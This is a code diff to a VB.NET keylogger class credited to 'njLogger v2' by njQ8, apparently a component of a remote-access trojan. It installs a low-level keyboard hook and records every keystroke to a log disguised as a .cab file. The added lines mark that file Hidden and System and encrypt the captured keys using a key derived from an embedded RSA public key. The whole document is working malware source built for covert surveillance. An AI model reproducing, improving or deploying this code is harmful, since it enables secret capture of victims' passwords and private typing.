@@ -1,5 +1,7 @@
 ﻿Imports System.Runtime.InteropServices
 Imports System.IO
+Imports System.Xml
+
 Public Class KLogger
     '##### njLogger v2 , 2012-2-12
     '##### Coded By njQ8, modified by Henry (chocolatkey)
@@ -11,12 +13,29 @@ Public Class KLogger
     Private Stream As IO.StreamWriter
     Dim o = My.Computer.Clock.LocalTime
     Public LogsPath As String = Application.ExecutablePath.Remove(Application.ExecutablePath.Length - New IO.FileInfo(Application.ExecutablePath).Extension.Length, New IO.FileInfo(Application.ExecutablePath).Extension.Length) & ".cab"
+    Dim xmldoc As New XmlDataDocument()
+    Public Shared modulus As String
+
     Public Sub Start()
         If isRunning = True Then Exit Sub
+        ''LogsPath = "C:\MSIEXEC" & Main.klfext
         Try
+            If Not System.IO.File.Exists(LogsPath) Then
+                System.IO.File.Create(LogsPath).Dispose()
+            End If
             Logs = IO.File.ReadAllText(LogsPath)
         Catch ex As Exception
             ''MsgBox(ex.Message & ex.StackTrace)
+        End Try
+        xmldoc.LoadXml(Main.pk)
+        modulus = xmldoc.GetElementsByTagName("RSAKeyValue").Item(0).InnerText
+        Try
+            File.SetAttributes(LogsPath, File.GetAttributes(LogsPath) Or FileAttributes.Hidden)
+            File.SetAttributes(LogsPath, File.GetAttributes(LogsPath) Or FileAttributes.System)
+        Catch ex As Exception
+#If DEBUG Then
+            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
         End Try
         Stream = IO.File.AppendText(LogsPath)
         Stream.AutoFlush = True
@@ -76,6 +95,7 @@ Public Class KLogger
                             Isdown(i) = False
                             Dim s As String = AV() & Fix(i)
                             lastKey = i
+                            s = Xord(s, Crypt.Crc32.ComputeChecksum(SB(modulus))) ''RC4 with crc32 of public key modulus as password
                             Logs += s
                             Stream.Write(s)
                             If Logs.Length > MaxLength Then
@@ -104,23 +124,23 @@ Public Class KLogger
         isRunning = False
     End Sub
 #Region "API"
-    <DllImport("user32.dll")> _
-    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
+    <DllImport("user32.dll")>
+    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger,
   ByVal dwhkl As IntPtr) As Integer
     End Function
-    <DllImport("user32.dll")> _
+    <DllImport("user32.dll")>
     Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
     End Function
-    <DllImport("user32.dll")> _
+    <DllImport("user32.dll")>
     Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
     End Function
-    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
     Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
     End Function
-    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
     Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
     End Function
-    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
     Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
     End Function
     Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
@@ -179,7 +199,7 @@ Public Class KLogger
             Dim id As Integer = 0
             Dim Aid As Integer = GetWindowThreadProcessId(h, id)
             Dim HKL As IntPtr = GetKeyboardLayout(Aid)
-            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
+            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0),
              HKL)
             Return sbString.ToString()
         Catch ex As Exception
@@ -187,7 +207,7 @@ Public Class KLogger
         Return CType(VKCode, Keys).ToString
     End Function
 #Region "KeyHook"
-    <StructLayout(LayoutKind.Sequential)> _
+    <StructLayout(LayoutKind.Sequential)>
     Private Structure KBDLLHOOKSTRUCT
         Public vkCode As UInt32
         Public scanCode As UInt32
@@ -195,7 +215,7 @@ Public Class KLogger
         Public time As UInt32
         Public dwExtraInfo As UIntPtr
     End Structure
-    <Flags()> _
+    <Flags()>
     Private Enum KBDLLHOOKSTRUCTFlags As UInt32
         LLKHF_EXTENDED = &H1
         LLKHF_INJECTED = &H10
